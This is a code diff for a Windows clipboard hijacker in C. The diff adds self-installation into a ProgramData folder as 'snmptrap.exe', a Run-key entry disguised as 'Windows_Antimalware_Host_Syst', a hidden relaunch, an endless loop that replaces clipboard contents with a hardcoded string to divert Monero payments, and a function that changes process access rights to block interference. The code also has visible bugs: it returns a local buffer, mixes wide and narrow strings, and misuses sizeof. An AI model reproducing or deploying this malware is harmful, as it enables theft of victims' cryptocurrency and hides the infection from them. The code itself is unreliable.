@@ -1,5 +1,6 @@
 #include <windows.h>
 #include <shlwapi.h>
+#include <sddl.h>
 
 #pragma comment(linker, "/MERGE:.data=.text")
 #pragma comment(linker, "/MERGE:.rdata=.text")
@@ -7,6 +8,47 @@
 
 #pragma comment (lib, "shlwapi.lib")
 
+/*
+	Check file is exist
+*/
+BOOL isFileExists(LPCTSTR szPath)
+{
+	DWORD dwAttrib = GetFileAttributes(szPath);
+
+	return (dwAttrib != INVALID_FILE_ATTRIBUTES && !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
+}
+
+/*
+	Full Path Getter
+*/
+char* GetFullPathFromProcId(DWORD pId)
+{
+	wchar_t buffer[MAX_PATH];
+	GetModuleFileName(NULL, buffer, MAX_PATH);
+
+	return buffer;
+}
+
+/*
+	Change DACL
+*/
+void DenyAccessToPId(DWORD pId)
+{
+	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pId);
+	SECURITY_ATTRIBUTES sa;
+	TCHAR * szSD = TEXT("D:P");
+	TEXT("(D;OICI;GA;;;BG)");
+	TEXT("(D;OICI;GA;;;AN)");
+	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
+	sa.bInheritHandle = FALSE;
+
+	ConvertStringSecurityDescriptorToSecurityDescriptor(szSD, SDDL_REVISION_1, &(sa.lpSecurityDescriptor), NULL);
+	SetKernelObjectSecurity(hProcess, DACL_SECURITY_INFORMATION, sa.lpSecurityDescriptor);
+}
+
+/*
+	Change Clipboard text
+*/
 void ChangeClipboard(wchar_t*str, int n)
 {
 	size_t len, i;
@@ -23,23 +65,73 @@ void ChangeClipboard(wchar_t*str, int n)
 	CloseClipboard();
 }
 
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
+/*
+	General Thread
+*/
+void Mnemosyne()
 {
 	HANDLE clip;
 	char* monero_poloniex = "you pidor";
 	char* pch;
 
-	if (OpenClipboard(NULL)) {
-		clip = GetClipboardData(CF_TEXT);
-		CloseClipboard();
-	}
-
-	// 4JUdGzvrMFDWrUUwY3toJATSeNwjn54Lk monero poloniex
-	pch = strstr(monero_poloniex, "4JUdGzvrMFDWrUUwY3toJATSeNwjn54Lk");
-
-	if (!pch)
+	while (TRUE)
 	{
-		ChangeClipboard(monero_poloniex, sizeof(monero_poloniex));
+		if (OpenClipboard(NULL)) {
+			clip = GetClipboardData(CF_TEXT);
+			CloseClipboard();
+		}
+
+		// 4JUdGzvrMFDWrUUwY3toJATSeNwjn54Lk monero poloniex
+		pch = strstr(monero_poloniex, "4JUdGzvrMFDWrUUwY3toJATSeNwjn54Lk");
+
+		if (!pch)
+		{
+			ChangeClipboard(monero_poloniex, sizeof(monero_poloniex));
+		}
+
+		Sleep(1000);
+	}
+}
+
+/*
+	Install in System
+*/
+void Install()
+{
+	char thisExe[MAX_PATH] = "";
+	HKEY hkey;
+
+	CreateDirectory("C:\\ProgramData\\{95B4F0ED-951F-4D36-B068-5EC1C4C19C14}", NULL);
+	GetModuleFileName(NULL, thisExe, MAX_PATH);
+	CopyFile(thisExe, "C:\\ProgramData\\{95B4F0ED-951F-4D36-B068-5EC1C4C19C14}\\snmptrap.exe", TRUE);
+
+	RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey);
+	RegSetValueEx(hkey, "Windows_Antimalware_Host_Syst", 0, REG_SZ, "C:\\ProgramData\\{95B4F0ED-951F-4D36-B068-5EC1C4C19C14}\\snmptrap.exe", 70);
+	RegCloseKey(hkey);
+
+	SetCurrentDirectory("C:\\ProgramData\\{95B4F0ED-951F-4D36-B068-5EC1C4C19C14}");
+	ShellExecute(NULL, 0, "C:\\ProgramData\\{95B4F0ED-951F-4D36-B068-5EC1C4C19C14}\\snmptrap.exe", "", 0, SW_HIDE);
+}
+
+/*
+	Init
+*/
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
+{
+	if (isFileExists("C:\\ProgramData\\{95B4F0ED-951F-4D36-B068-5EC1C4C19C14}\\snmptrap.exe"))
+	{
+		if (strcmp(GetFullPathFromProcId(GetCurrentProcessId()), "C:\\ProgramData\\{95B4F0ED-951F-4D36-B068-5EC1C4C19C14}\\snmptrap.exe") == 0)
+		{
+			Mnemosyne();
+		}
+		else
+		{
+			ExitProcess(0);
+		}
+	}
+	else
+	{
+		Install();
 	}
 
 	ExitProcess(0);
